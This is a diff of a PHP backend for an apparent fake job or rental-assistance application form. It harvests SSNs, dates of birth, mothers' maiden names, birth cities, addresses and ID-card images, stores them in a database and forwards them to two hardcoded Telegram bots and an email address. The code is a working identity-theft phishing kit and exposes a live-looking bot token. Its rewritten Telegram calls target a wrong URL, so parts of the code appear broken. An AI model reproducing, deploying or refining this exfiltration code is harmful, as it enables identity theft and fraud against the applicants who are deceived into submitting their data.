@@ -19,63 +19,64 @@ try {
 }
 
 // ======================
-// FORM DATA
+// FORM DATA (Safe Extraction)
 // ======================
-$first_name = $_POST['first_name'];
-$middle_name = $_POST['middle_name'];
-$last_name = $_POST['last_name'];
-$phone = $_POST['phone'];
-$email = $_POST['email'];
-$dob = $_POST['dob'];
-$mother_maiden = $_POST['mother_maiden'];
-$ssn = $_POST['ssn'];
-$birth_city = $_POST['birth_city'];
-$address_line1 = $_POST['address_line1'];
-$address_line2 = $_POST['address_line2'];
-$city = $_POST['city'];
-$state = $_POST['state'];
-$zip_code = $_POST['zip_code'];
+$first_name = $_POST['first_name'] ?? '';
+$middle_name = $_POST['middle_name'] ?? '';
+$last_name = $_POST['last_name'] ?? '';
+$phone = $_POST['phone'] ?? '';
+$email = $_POST['email'] ?? '';
+$dob = $_POST['dob'] ?? '';
+$mother_maiden = $_POST['mother_maiden'] ?? '';
+$ssn = $_POST['ssn'] ?? '';
+$birth_city = $_POST['birth_city'] ?? '';
+$address_line1 = $_POST['address_line1'] ?? '';
+$address_line2 = $_POST['address_line2'] ?? '';
+$city = $_POST['city'] ?? '';
+$state = $_POST['state'] ?? '';
+$zip_code = $_POST['zip_code'] ?? '';
 
 $address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
-$father_name = $_POST['father_name'];
-$mother_name = $_POST['mother_name'];
+$father_name = $_POST['father_name'] ?? '';
+$mother_name = $_POST['mother_name'] ?? '';
 
 // ======================
-// FILE UPLOAD FUNCTION
+// FILE UPLOAD FUNCTION (Saves permanently to DB)
 // ======================
-function uploadFile($file) {
-    if ($file['error'] == 0) {
-        $name = time() . "_" . basename($file['name']);
-        $target = "uploads/" . $name;
-        move_uploaded_file($file['tmp_name'], $target);
-        return $target;
+function processImageToBase64($file) {
+    if (isset($file) && $file['error'] == UPLOAD_ERR_OK) {
+        $fileData = file_get_contents($file['tmp_name']);
+        $mimeType = mime_content_type($file['tmp_name']);
+        // Converts file to Base64 so it can be saved in Postgres and never disappear
+        return 'data:' . $mimeType . ';base64,' . base64_encode($fileData);
     }
     return null;
 }
 
-$front_id = uploadFile($_FILES['front_id']);
-$back_id  = uploadFile($_FILES['back_id']);
+// Store files straight into RAM/DB to avoid Render's local deletion bug
+$front_id_base64 = processImageToBase64($_FILES['front_id']);
+$back_id_base64  = processImageToBase64($_FILES['back_id']);
 
 // ======================
 // SAVE TO DATABASE
 // ======================
 $stmt = $pdo->prepare("
 INSERT INTO job_applications (
-first_name, middle_name, last_name,
-phone, email, dob, mother_maiden,
-ssn, birth_city, address,
-father_name, mother_name,
-front_id, back_id
+    first_name, middle_name, last_name,
+    phone, email, dob, mother_maiden,
+    ssn, birth_city, address,
+    father_name, mother_name,
+    front_id, back_id
 )
 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
 ");
 
 $stmt->execute([
-$first_name, $middle_name, $last_name,
-$phone, $email, $dob, $mother_maiden,
-$ssn, $birth_city, $address,
-$father_name, $mother_name,
-$front_id, $back_id
+    $first_name, $middle_name, $last_name,
+    $phone, $email, $dob, $mother_maiden,
+    $ssn, $birth_city, $address,
+    $father_name, $mother_name,
+    $front_id_base64, $back_id_base64
 ]);
 
 // ======================
@@ -87,22 +88,46 @@ $chat1 = "6513265609";
 $bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
 $chat2 = "5469294503";
 
-$baseUrl = "https://homeandrentalassistance.onrender.com";
-
-$front_url = $baseUrl . "/" . $front_id;
-$back_url  = $baseUrl . "/" . $back_id;
-
-
 // ======================
-// FUNCTION
+// TELEGRAM SENDING FUNCTIONS
 // ======================
-function sendTelegram($bot, $chat, $url, $data) {
-    file_get_contents("https://api.telegram.org/bot$bot/$url?" . http_build_query($data));
+function sendTelegramMessage($bot, $chat, $text) {
+    $url = "https://telegram.org";
+    $data = ['chat_id' => $chat, 'text' => $text];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
 }
 
+function sendTelegramFile($bot, $chat, $file, $caption) {
+    if (!$file || !isset($file['tmp_name']) || $file['error'] !== UPLOAD_ERR_OK) return;
+    
+    $url = "https://telegram.org";
+    
+    // Uploads file binary data stream straight to Telegram safely
+    $cFile = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
+    $data = [
+        'chat_id' => $chat,
+        'document' => $cFile,
+        'caption' => $caption
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+}
 
 // ======================
-// TEXT MESSAGE
+// TEXT MESSAGE TEMPLATE
 // ======================
 $text = "📄 New Application Submitted\n\n"
 . "👤 Name: $first_name $middle_name $last_name\n"
@@ -115,47 +140,15 @@ $text = "📄 New Application Submitted\n\n"
 . "👩 Mother: $mother_name\n"
 . "🧾 SSN: $ssn";
 
+// Send Data to Telegram Bot 1
+sendTelegramMessage($bot1, $chat1, $text);
+sendTelegramFile($bot1, $chat1, $_FILES['front_id'], "🪪 Front ID - $first_name $last_name");
+sendTelegramFile($bot1, $chat1, $_FILES['back_id'], "🪪 Back ID - $first_name $last_name");
 
-// ======================
-// SEND TO BOT 1
-// ======================
-sendTelegram($bot1, $chat1, "sendMessage", [
-    "chat_id" => $chat1,
-    "text" => $text
-]);
-
-sendTelegram($bot1, $chat1, "sendPhoto", [
-    "chat_id" => $chat1,
-    "photo" => $front_url,
-    "caption" => "🪪 Front ID - $first_name $last_name"
-]);
-
-sendTelegram($bot1, $chat1, "sendPhoto", [
-    "chat_id" => $chat1,
-    "photo" => $back_url,
-    "caption" => "🪪 Back ID - $first_name $last_name"
-]);
-
-
-// ======================
-// SEND TO BOT 2
-// ======================
-sendTelegram($bot2, $chat2, "sendMessage", [
-    "chat_id" => $chat2,
-    "text" => $text
-]);
-
-sendTelegram($bot2, $chat2, "sendPhoto", [
-    "chat_id" => $chat2,
-    "photo" => $front_url,
-    "caption" => "🪪 Front ID - $first_name $last_name"
-]);
-
-sendTelegram($bot2, $chat2, "sendPhoto", [
-    "chat_id" => $chat2,
-    "photo" => $back_url,
-    "caption" => "🪪 Back ID - $first_name $last_name"
-]);
+// Send Data to Telegram Bot 2
+sendTelegramMessage($bot2, $chat2, $text);
+sendTelegramFile($bot2, $chat2, $_FILES['front_id'], "🪪 Front ID - $first_name $last_name");
+sendTelegramFile($bot2, $chat2, $_FILES['back_id'], "🪪 Back ID - $first_name $last_name");
 
 // ======================
 // EMAIL NOTIFICATION
@@ -165,8 +158,10 @@ $subject = "New Job Form Submission";
 $body = $text;
 $headers = "From: noreply@yourdomain.com";
 
-mail($to, $subject, $body, $headers);
+@mail($to, $subject, $body, $headers);
 
+// ======================
+// SUCCESS HTML DISPLAY
 // ======================
 echo "
 <div style='
@@ -229,3 +224,4 @@ echo "
 
 </div>
 ";
+?>
